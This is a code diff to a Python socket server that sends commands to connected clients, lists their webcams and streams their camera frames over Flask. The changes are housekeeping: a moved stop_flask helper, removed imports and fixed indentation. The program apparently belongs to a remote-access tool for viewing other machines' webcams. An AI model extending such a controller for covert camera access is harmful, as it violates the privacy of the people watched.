@@ -6,8 +6,6 @@ from colorama import Fore, init
 import cv2
 import numpy as np
 import keyboard  # Import the keyboard library
-import signal
-import werkzeug
 
 init(autoreset=True)
 
@@ -54,19 +52,12 @@ def start_streaming(client_socket, mode, client_id):
     def index():
         return render_template_string(html_template)
 
-    def stop_flask():
-    func = request.environ.get('werkzeug.server.shutdown')
-    if func is None:
-        raise RuntimeError('Not running with the Werkzeug Server')
-    func()
-
-  
     @app.route(f'/video_feed_{client_id}')
     def video_feed():
         return Response(generate_frames(client_socket, client_id),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
 
-     @app.route(f'/stop_streaming_{client_id}', methods=['POST'])
+    @app.route(f'/stop_streaming_{client_id}', methods=['POST'])
     def stop_streaming_route():
         global streaming
         streaming = False
@@ -78,8 +69,6 @@ def start_streaming(client_socket, mode, client_id):
 
     # Run the Flask app in a separate thread to handle the streaming
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
-
-
 
 def generate_frames(client_socket, client_id):
     global streaming
@@ -188,6 +177,12 @@ def handle_client(client_socket, addr):
             client_socket.send(command.encode('utf-8'))
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + "[ * ] Available Webcams:\n" + response)
+
+def stop_flask():
+    func = request.environ.get('werkzeug.server.shutdown')
+    if func is None:
+        raise RuntimeError('Not running with the Werkzeug Server')
+    func()
 
 def main():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
